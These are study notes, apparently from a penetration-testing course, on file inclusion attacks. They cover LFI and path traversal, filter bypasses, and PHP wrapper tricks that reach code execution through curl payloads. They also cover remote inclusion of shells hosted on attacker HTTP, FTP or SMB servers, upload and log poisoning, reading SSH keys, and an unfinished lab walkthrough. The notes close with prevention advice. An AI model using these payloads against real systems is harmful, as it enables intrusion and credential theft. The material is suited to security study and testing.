# File Inclusion 

## Intro to File Inclusions 

many modern backends use HTTP parameters to specify what is shown on the web page   
in such cases, parameters are used to specify what resources are shown   
an attacker can manipulate these parameters to display the content of any local file on the hosting server, leading to a `Local File Inclusion (LFI)` vulnerability 

### Local file inclusion (LFI)

the most common place we usually find LFI in is templating engines   
template engines display pages that show common static parts like the header, nav bar, footer, etc. and dynamically load other content that changes between pages   
otherwise, every page on the server would need to be modified if shared static parts are changed   

we often see things like `/index.php?page=about` where index.php sets static content like the header and footer and then only pulls the dynamic content specified in the parameter   
we would have control over the about content so it could be possible grab other files and display them 

LFI can lead to source code disclosure, sensitive data exposure, and RCE   

### Examples of vulnerable code 

there are many different types of apps and web servers that LFI can be present in but they all share the common factor of loading a file from a specified path  
these files can be dynamic headers or different content based on the user-specified language, for example a `?language` GET parameter  
in this example the language may change the directory the web app loads pages from like `/en` and if we have control over the path being loaded we may be able to exploit it to read other files or get RCE 

### PHP 

the `include()` function loads a local or a remote file as we load a page   
sometimes the path used will be from a user-controlled parameter and without any filtering the code becomes vulnerable to LFI 

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

some other functions vulnerable to this are `include_once()`, `require()`, `require_once()`, and `file_get_contents()`, but there are several more 

### NodeJS 

here is an example of how a GET parameter is used to control what is shown on the page for nodejs: 

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

whatever parameter gets passed from the url is used in the `readFile()` function which then writes the file content in the HTTP response   

express.js also has the `render()` function which can be used to determine which directory to pull files from: 

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

### Java 

java web apps may include local files with the `include` function: 

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

`include` will take a file or page url and render it to the frontend template   

`import` can also be used to render local files or urls: 

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

### .NET

`Response.WriteFile` takes a file path and writes its content to the response   

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

the `@Html.Partial()` function can also be used to render the specified file as part of the frontend: 

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

the `include` function can also be used to render local files or remote URLs, and can even execute the files as well

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

### Read vs execute 

keep in mind that some of the above mentioned functions only read the content of the files, while others will also execute them   
also, some only allow specifying remote URLs while others only work with local files 

![](Images/Pasted%20image%2020240228105734.png)

this is significant because executing files may allow us to execute functions and lead to RCE, while only reading the file will only let us read the source code 

even just being able to read the source code from an LFI vulnerability may lead to revealing other vulnerabilities or leak info like database keys, admin credentials, or other sensitive info 

## Local File Inclusion (LFI)

### Basic LFI 

we have a target web app that lets you change your language: 

![](Images/Pasted%20image%2020240228110317.png)

changing the language we can see the `language=es.php` parameter being set: 

![](Images/Pasted%20image%2020240228110353.png)

this content could be loaded from a different database table based on the parameter, or it could be loading an entirely different version of the web app, and there are many other ways that the different content is loaded  

remember that loading part of the page using template engines is the easiest and most common method used   
so if the web app is pulling a file that is now being included in the page, then we might be able to change that file to read different ones   
two common readable files that are available on most backend servers are `/etc/passwd` on linux and `C:\Windows\boot.ini` on windows   

we can try to change the parameter to see if we can read a local file: 

![](Images/Pasted%20image%2020240228111604.png)

### Path traversal 

in the above example we read a file by specifying its absolute path of `/etc/passwd`, which would work if the whole input is used in the whatever include function is being used like in: 

```php
include($_GET['language']);
```

however in many cases developers will concatenate the request parameter into the file strings: 

```php
include("./languages/" . $_GET['language']);
```

this would not work because in the above example it would become `./languages//etc/passwd` 

we can bypass this by traversing directories using relative paths by adding `../` before our file name to traverse up  

if we are in the index.php directory then we can move up the chain of `/var/www/html/index.php` and get into `../../../../etc/passwd`: 

![](Images/Pasted%20image%2020240228112625.png)

remember that if we reach the root and use `../` it will simply keep us in the root path so one trick is to use many `../` to try to get there   
however always try to be efficient and find the minimum number of `../` 

### Filename prefix 

sometimes our parameter will be used to get a filename like: 

```php
include("lang_" . $_GET['language']);
```

this would result in `lang_../../../etc/passwd` but we can get around this by prefixing a `/` so that it should consider the prefix as a directory and we should bypass the filename: 

![](Images/Pasted%20image%2020240228113220.png)

this wont always work because the example directory `lang_/` may not exist, also any prefix appended to our input may break some file inclusion techniques 

### Appended extensions 

sometimes extensions will be appended to the parameters we use: 

```php
include($_GET['language'] . ".php");
```

there are many ways to get around this which we will discuss in further sections 

### Second-order attacks 

second-order attacks occur because many web apps may be insecurely pulling files from the backend server based on user-controlled parameters 

a web app might allow us to download our avatar through a URL like `/profile/$username/avatar.png`   
using a malicious username like `../../../etc/passwd` then it could be possible to grab another file than our avatar 

in this example we would poison a db entry with a malicious LFI payload in our username, then another web app functionality would use this entry to perform our attack (download our avatar), this is why it is called a second-order attack 

these vulnerabilities are often overlooked because they may protect against direct user input but it would trust values pulled from the database, so if we managed to poison the database value for our username then this would be possible 

the only difference between these attacks and the previous attacks is we need to find a function that pulls a file based on a value we indirectly control and then try to control that value to exploit this vulnerability 

## Basic Bypasses

### Non-recursive path traversal filters 

one of the most basic filters against LFI is a search and replace filter where it simply deletes substrings like `../` to avoid path traversal: 

```php
$language = str_replace('../', '', $_GET['language']);
```

this however is not recursive, so it runs a single time and does not apply the filter on the output string   
if we used `....//` as our payload then the filter will remove `../` and the result will be `../`: 

![](Images/Pasted%20image%2020240228174336.png)

we can so the same with other payloads like `..././` or `....\/`   
in some other cases, escaping the forward slash character may also avoid path traversal `....\/` or adding forward slashes `....////` 

### Encoding 

some web filters may prevent input filters that include LFI characters like `.` or `/`, but some of these may be bypassed by url encoding our input 

for this to work we need to url encode all characters: 

![](Images/Pasted%20image%2020240228175118.png)

![](Images/Pasted%20image%2020240228175340.png)

another trick is to encode the encoded string to create a double encoded string which might also bypass certain filters 

### Approved paths 

some apps will use regex to ensure that the file being included is under a specific path, for example only paths that are under the `./languages` directory: 

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

to find the approved path we can look at the requests sent by the existing forms   
we can also fuzz for web directories under the same path 

to bypass this we can start our payload with the approved path and use `../` to go back to the root directory: 

![](Images/Pasted%20image%2020240228180016.png)

we can combine this with other techniques like url encoding to get past other filters 

### Appended extension 

modern versions of PHP will not let us bypass the extension restrictions but it is useful to know about them

#### Path truncation 

in some earlier versions of PHP strings had a max length of 4096 chars and if a longer string is passed then it will be truncated and any characters after the max will be ignored   
it also used to remove trailing slashes and single dots in path names so if you called `/etc/passwd/.` then the `/.` would be removed   
PHP and linux in general also disregard multiple slashes in the path so `////etc/passwd` is the same as `/etc/passwd`  
a current directory shortcut in the middle of the path would also be ignored `/etc/./passwd`

we can combine these to create very long strings that evaluate to the correct path   
if we reach 4096 characters then the appended extension .php would be truncated   
it is important to note that we would need to start the path with a non-existing directory for this to work 

another example would be: 

![](Images/Pasted%20image%2020240228182014.png)

could automate this with: 

```shell-session
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

we only need to make sure that the extension is truncated and not our payload 

#### Null bytes 

php before 5.5 were vulnerable to null byte injection which means that adding a null byte `%00` at the end of the string would terminate the string and not consider anything after it   

our payload would become something like `/etc/passwd%00` which would truncate any appended extension 

## PHP Filters

we can use PHP wrappers to extend our LFI exploitations to potentially even reach RCE 

wrappers allow us to access I/O streams at the app level like standard I/O, file descriptors, and memory streams   
we can extend our attacks with these to read PHP source code files or execute commands 

### Input filters 

php filtesr are a type of wrapper where we can pass different types of input and have it filtered by the filter we specify   

to use PHP wrapper streams we use `php://` and can access the php filter with `php://filter/` 

the `filter` wrapper has several parameters but we are focused on `resource` and `read`  
`resource` is required and it specifies the stream we apply the filter to   
`read` applies different filters on the input resource 

there are four different types of filters: 
- string
- conversion 
- compression
- encryption 

the one useful for LFI attacks is `convert.base64-encode` under conversion filters 

### Fuzzing for PHP files 

fist step is to fuzz for available PHP pages: 

```shell-session
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

remember we should be scanning for codes like 301, 302, and 403 as well because we should be able to read their source code as well 

with the results from these we can again scan those files to see which ones they reference so we can get an accurate image of the the app does 

### Standard PHP inclusion 

in our previous examples if we referenced PHP files they would get rendered as HTML to our target web page, however if we choose files like `config.php` we get a blank output: 

![](Images/Pasted%20image%2020240228193750.png)

this may be useful in cases like accessing local files we don't have access to (SSRF), but in most cases we are concerned with reading the source code through LFI 

### Source code disclosure 

to view the source code of the file we can base64 encode the contents and have that printed out to the app: 

```url
php://filter/read=convert.base64-encode/resource=config 4
```

![](Images/Pasted%20image%2020240228194030.png)

remember that in this scenario the extension is automatically added on 

## PHP Wrappers 

now we will focus on gaining RCE   

one easy way to gain control over the backend server is enumerate user credentials and SSH keys and use them to login   
for example we may find the db password in a file like config.php which might also be the same password used for a user's account   
can also check the .ssh directory in each user's home directory and if the read privileges aren't set right then we could grab their private key id_rsa and use it to ssh to the system 

there are other ways to achieve RCE directly through the vulnerable function without relying on data enumeration or local file privileges   

### Data 

the `data` wrapper can be used to include external data, including PHP code   
only available to use if the `allow_url_include` setting is enabled 

we can check the configs file found at `/etc/php/X.Y/apache2/php.ini` for apache or `/etc/php/X.Y/fpm/php.ini` for nginx   
`X.Y` = the PHP version   
we will also use the base64 filter because .ini files are like .php files and should be encoded to avoid breaking 

```shell
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

we can then take the base64 encoded results and decode them to look for the `allow_url_include` setting: 

```shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

![](Images/Pasted%20image%2020240229091750.png)

now we know that we can use the `data` wrapper, and remember that this is not set by default but is required for several other LFI attacks   
it is not uncommon to see this setting set because it is required by many functionalities

we can now combine the `data` wrapper with base64 using `text/plain;base64`  

first we base64 encode a basic PHP shell: 

![](Images/Pasted%20image%2020240229092125.png)

which we can then url encode and use with the base64 data wrapper to execute commands: 

```shell
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<base64 encoded web shell>&cmd=id' | grep uid
```

### Input 

similar to the `data` wrapper the `input` wrapper can be used to include external input and execute php code   
the difference is that we pass our input to the `input` wrapper as a POST request's data, so the vulnerable parameter must accept POST requests for this to work   
the `input` wrapper also depends on the `allow_url_include` to be enabled 

```shell
curl -s -X POST --data '<php web shell>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

with our previous shell, in order to pass our command as a GET request we need the vulnerable function to also accept GET requests, if it only accepts POST requests then we can put our command directly in our PHP code with something like `<\?php system('id')?>`

### Expect 

the `expect` wrapper also allows us to directly run commands through URL streams   
works similar to the other shells we've used but we don't need to provide a web shell because it is designed to execute commands 

`expect` is an external wrapper though so it needs to be manually installed and enabled on the backend server, but some apps rely on it so we may find it in some cases   

we can do the same search we did with `allow_url_include` but instead grep for `expect` and we should find `extension=expect`

all we need to do with this is pass the `expect://` wrapper and pass the command we want to execute: 

```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## Remote File Inclusion (RFI)

sometimes the vulnerable function will allow the inclusion of remote urls, which we can exploit for two main benefits: 
- enumerate local-only ports and web apps for SSRF 
- gain RCE by including malicious script that we host 

### Local vs. remote file inclusion 

these functions would allow RFI: 

![](Images/Pasted%20image%2020240229095511.png)

almost any RFI vulnerability is also an LFI vulnerability but an LFI might not always be RFI because: 
- it might not allow remote URLs 
- may only control a portion of the filename and not the entire protocol wrapper like `http://`, `ftp://`, and `https://` 
- config may prevent RFI altogether as most modern servers disable remote files by default

it is also worth noting that some function still will not allow code execution but we still would be able to enumerate local ports and web apps through SSRF 

### Verify RFI 

including remote URLs also requires `allow_url_include` to be enabled, but this isn't always reliable because even if it is set it still might not allow remote URLs   

first we should always try a local url: 

![](Images/Pasted%20image%2020240229100234.png)

### Remote code execution with RFI 

first we need to create a shell script in the required language and host it on our server, most likely on a common HTTP port like 80 or 443 because these might be whitelisted by the server  
we may also host the script through an FTP service or an SMB service 

we start our server with `sudo python3 -m http.server 443` and use our shell in the parameter: 

![](Images/Pasted%20image%2020240229101156.png)

![](Images/Pasted%20image%2020240229101217.png)

make sure to always examine the request we send to look for things like appended file extensions 

### FTP 

we can also host our script through the FTP protocol   
we can start a basic FTP server with python's pyftpdlib: 

`sudo -m pyftpdlib -p 21`


![](Images/Pasted%20image%2020240229101541.png)

this may be useful in case that http ports are blocked by a firewall or `http://` in the url gets blocked by the WAF 

PHP by default will try to authenticate as an anonymous user but if the server requires valid authentication then the credentials can be specified in the URL: 

```shell
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

### SMB 

if the server is hosted on a windows server which we can tell from the server version in the HTTP response headers, then we don't need the `allow_url_include` setting to be enabled   
we can instead use the SMB protocol for the RFI because windows treats files on remote SMB servers as normal files and can be referenced with a UNC path 

we can create an SMB server with Impacket's smbserver.py which allows anonymous authentication by default: 

```shell
impacket-smbserver -smb2support share $(pwd)
```

then we include our script in the UNC path like `\\<our IP>\share\shell.php` and specify the command: 

![](Images/Pasted%20image%2020240229102017.png)

this attack is more likely to work if we are on the same network since accessing remote SMB servers over the internet might be disabled by default depending on the windows server config 

## LFI and File Uploads

file upload vulnerabilities will always exist, but for this attack we don't need the file upload form to be vulnerable, we just need it to upload files  
if the vulnerable function has code execute capabilities then the code within the file will be executed if we include it, regardless of file extension or type   

these functions will allow executing code with file inclusion: 

![](Images/Pasted%20image%2020240229102854.png)

### Image upload 

first we want to create a malicious image containing our shell code   
we will use an allowed image extension and include the image magic bytes at the beginning of the file content: 

`echo 'GIF8<php shell code>' > shell.gif`

once we use the app to upload our file we can search for the uploaded file path in the source code: 

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

we could also fuzz for the uploads directory and fuzz for our uploaded file but this might not always work if apps properly hide their uploaded files 

now with the uploaded file path all we need to do is include the path in the LFI vulnerable function: 

![](Images/Pasted%20image%2020240229103625.png)

note that we will have to adjust our directory based on the traversal protections 

### Zip upload 

the above technique is reliable and should work in most cases as long as the vulnerable function allows code execution   
there are a couple other PHP-only techniques that use PHP wrappers to achieve the same goal 

we can use the `zip` wrapper to execute PHP code but it isn't enabled by default so this might not always work 

we can start by creating our shell and zipping it into a zip archive: 

```shell-session
echo '<shell>' > shell.php && zip shell.jpg shell.php
```

note that even though we named our file shell.jpg some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload 

we can then include this file with the `zip` wrapper as `zip://shell.jpg` and then refer to any files within it as `#shell.php`: 

![](Images/Pasted%20image%2020240229104104.png)

note that we added the uploads directory `./profile_images/` before the file name because the vulnerable page index.php is in the main directory 

### Phar upload 

we can also use the `phar://` wrapper to achieve a similar result   

first we create the following php code into shell.php: 

![](Images/Pasted%20image%2020240229104306.png)

this can be then compiled into a phar file that when called will write a shell to a shell.txt sub-file which we can interact with   

we compile the script into a phar file and rename it to shell.jpg: 

```shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

we can then call the file with `phar://` and then specify the sub-file with `/shell.txt` url encoded: 

![](Images/Pasted%20image%2020240229104514.png)

both zip and phar methods should be considered as alternative methods in case the first method does not work

there are also some upload attacks worth noting if file uploads are enabled in the PHP configs and the `phpinfo()` page is somehow exposed to us but this isn't very common: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo

## Log Poisoning 

we have seen previously that if we include a file that contains PHP code that it will be executed as long as the vulnerable function has execute privileges   
log poisoning attacks all rely on the same concept, writing PHP code in a field we control that gets logged into a log file, then include that log file to execute the PHP code   
the PHP web app should have read privileges over the logged files which vary from one server to another 

any of these functions will have execute privileges: 

![](Images/Pasted%20image%2020240229190333.png)

### PHP session poisoning 

most php web apps use `PHPSESSID` cookies which hold specific user-related data on the back-end  
these details are stored in session files on the backend and saved in `/var/lib/php/sessions/` for linux and `C:\Windows\Temp` for windows   
the name of the file that contain a user's data matches the name of their `PHPSESSID` cookie with the `sess_` prefix: 

`/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`

first lets get our cookie: 

![](Images/Pasted%20image%2020240229203052.png)

then lets try to include this session file through the LFI vulnerability: 

![](Images/Pasted%20image%2020240229203155.png)

we can see that the session file contains the selected language and preference values  
the selected language is in our control since it is the page we select, but the preference value seems to be set somewhere out of our control 

lets try setting the selected_language value to a custom value and see if it changes the session file  
we can do this by visiting the page with a custom language value `?language=session_poisoning`

then we can revisit the session file to see if it changes: 

![](Images/Pasted%20image%2020240229203806.png)

our next step is to perform the poisoning attack by writing php code to the session file   
we can write and encode a php shell and insert it into the language parameter: 

![](Images/Pasted%20image%2020240229204014.png)

then we can revisit the page with our command: 

![](Images/Pasted%20image%2020240229204352.png)

keep in mind each time we do this we will have to re-poison the session file with the shell 

### Server log poisoning

both apache and nginx contain various log files like `access.log` and `error.log`   
`access.log` contains info about all requests made to the server, including the User-Agent which we can control to poison the log file   

when the logs are poisoned we need to include the logs through the LFI vulnerability which will require read access over the logs   
nginx logs are readable by low privileged users by default like www-data, while apache logs are only readable by users with high privileges (rood/adm)   
in older versions of apache these logs may be readable by low-privilege users 

by default apache logs are in `/var/log/apache2` on linux and in `C:\xampp\apache\logs\` on windows   
nginx logs are in `/var/log/nginx/` and `C:\nginx\log`   
logs could be in other locations so we can use an LFI wordlist to fuzz for them: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI

we can try to include the apache access log: 

![](Images/Pasted%20image%2020240229205235.png)

this contains the remote IP address, request page, response code, and the User-Agent header   

we can modify the user agent to see if it gets reflected in the response: 

![](Images/Pasted%20image%2020240229205533.png)

we can then poison the user agent with our shell or by sending a request through curl with: 

```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<shell>"
```

the user agent header is also shown on the process files under the linux `/proc/` directory so we can try including the `/proc/self/environ` or `/proc/self/fd/N` files where N is the PID usually between 0-50  
these files are only readable by privileged users 

there are some other service logs we may be able to read: 
- `/var/log/sshd.log` 
- `/var/log/mail` 
- `/var/log/vsftpd.log` 

we can do things like log into the ssh or ftp services and set the username to php code and upon including them in the logs the PHP code will execute   
the same goes for the mail services where we can send an email containing php code and on log inclusion it will get executed 

## Automated Scanning

many cases where we will need to create custom payloads to get past the specific combo of filters that an app is using  
there are also many auto methods that can help us quickly identify and exploit trivial LFI vulnerabilities   
we can also use fuzzing tools to test a list of common LFI payloads 

### Fuzzing parameters 

html forms may be securely protected but many apps have pages with exposed parameters that aren't linked to forms, which is why it is important to fuzz for hidden parameters 

with ffuf we can fuzz GET/POST parameters: 

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

there are also lists for popular LFI parameters: https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters

### LFI wordlists 

https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI  
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

these wordlists will contain various bypasses and common files that we can combine with ffuf: 

```shell
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

### Fuzzing server files 

in addition to fuzzing LFI payloads there are different server files that may be helpful for LFI exploitation   
some example files are: 
- server webroot path 
- server config file 
- server logs 

the server webroot will come in handy for example if we wanted to find a file we uploaded but can't reach its uploads directory through relative paths, in such cases we might want to find the webroot to figure out the absolute path 

we can fuzz for the index.php file through common webroot paths 

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt  
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

we could also use the previous LFI-jhaddix wordlist to find webroots   
if none of these work then we could read the server configs as they tend to contain the webroot  

### Server logs/configurations 

we will need to identify the correct logs directory to be able to perform log poisoning 

we can find this with the LFI-jhaddix wordlist but if we wanted a more precise scan we can use:   
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux  
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

```shell
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

once we get results we can try reading any of the files with a simple curl command: 

```shell
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

for an example if we read this file and see: 

![](Images/Pasted%20image%2020240302141750.png)

we get the default webroot path and the log path but we are missing the global apache variable `APACHE_LOG_DIR` which we can find in another file `/etc/apache2/envvars` which we can also read: 

```shell
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

### LFI tools 

the most common LFI tools are: 
- LFISuite
- LFIFreak
- liffy

a lot of these tools arent well maintained and rely on python2 

## File Inclusion Prevention 

the most effective thing we can do is avoid passing any user-controlled inputs into any file inclusion functions or APIs   
the page should be able to dynamically load assets on the backend without user input   
we need to ensure that the functions for each type of web app we have mentioned is not passed any user input as we have seen that attackers can exploit the permissions that they have  

some cases we will need to use user input in these functions and it can't be avoided, in these cases we should use a whitelist of allowed user inputs   
for example we can use a whitelist of all existing paths used in the frontend    
these can match IDs to files with a case-match script or a static json map with names and files that can be matched   
if this is implemented then the matched files are used in the function, not user input 

### Preventing directory traversal 

the best way to prevent directory traversal is to use the programming language's built-in tool to pull only the filename   
PHP `basename()` will read a path and only return the filename portion 

we can also sanitize user input recursively to remove any attempts to traverse directories: 

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

### Web server configuration 

we should globally disable the inclusion of remote files by disabling things like `allow_url_fopen` and `allow_url_include`   

it is also often possible to lock web apps to their web root directory   
most common way of doing this is running the app in Docker   
if this isn't possible then it is still possible to do this by adding something like `open_basedir = /var/www` in the php.ini file 

could also make sure that potentially dangerous modules are disabled like PHP expect `mod_userdir`   

### Web application firewall (WAF)

the universal way to harden apps is to use WAF such as ModSecurity   
most important thing is to avoid false positives and blocking non-malicious requests   
ModSecurity minimizes false positives with `permissive` mode 

remember that the goal of hardening is to make it so that logs generated by attacker's behavior will be more easily recognizable, not necessarily to make the system un-hackable 

## Skills Assessment - File Inclusion 

performing a web app assessment focused on file inclusion and path traversal vulnerabilities   
find the flag in the root directory 

immediately we can see a dynamic `page` parameter on our site that modifies the page content based on its value: 

![](Images/Pasted%20image%2020240303171137.png)

there is also a contact page message submission form that reveals the message parameter after submission: 

![](Images/Pasted%20image%2020240303171505.png)

these could likely be LFI vulnerable parameters but lets go ahead and fuzz for any other parameters just to see if there are any others: 

![](Images/Pasted%20image%2020240303174227.png)

to start with some very basic tests I use a very long string of `../../../` to try to read `/etc/passwd` using the `page` parameter: 

![](Images/Pasted%20image%2020240303174408.png)

I then try to get past the filter with `....//`: 

![](Images/Pasted%20image%2020240303174654.png)

next I try to use truncation but still get an invalid input: 

![](Images/Pasted%20image%2020240303174755.png)

now I want to try to use PHP filters and wrappers so first I want to fuzz for php files: 

![](Images/Pasted%20image%2020240303175603.png)

this actually resulted in some files that I hadn't seen just browsing the site, so I want to retry the parameter fuzzings for each file to see if there are any new results: 

![](Images/Pasted%20image%2020240303180059.png)

none of the new files seem to have any parameters that I don't know about yet so I again move on to trying to use PHP filters and wrappers to try to read some files: 

![](Images/Pasted%20image%2020240303180549.png)

I can see from this output that the PHP filter syntax doesn't get blocked by the parameter filters and I get the base64 encoded output of the index.php: 

![](Images/Pasted%20image%2020240303180646.png)

I also try to use the `input` and `expect` methods but with no results: 

`php://input&cmd=id`  
`expect://id`

so before I move on to loading files I want to first try an automated LFI tool since I am still having trouble finding a way around the parameter filters: 

![](Images/Pasted%20image%2020240303182517.png)
![](Images/Pasted%20image%2020240303182840.png)

these don't result in any useable payloads so now I will move on to remote file inclusion techniques

I start by trying to load a local file and don't see any results: 

![](Images/Pasted%20image%2020240303183046.png)

now I can host a web shell to attempt to load it on the site: 

![](Images/Pasted%20image%2020240303183234.png)




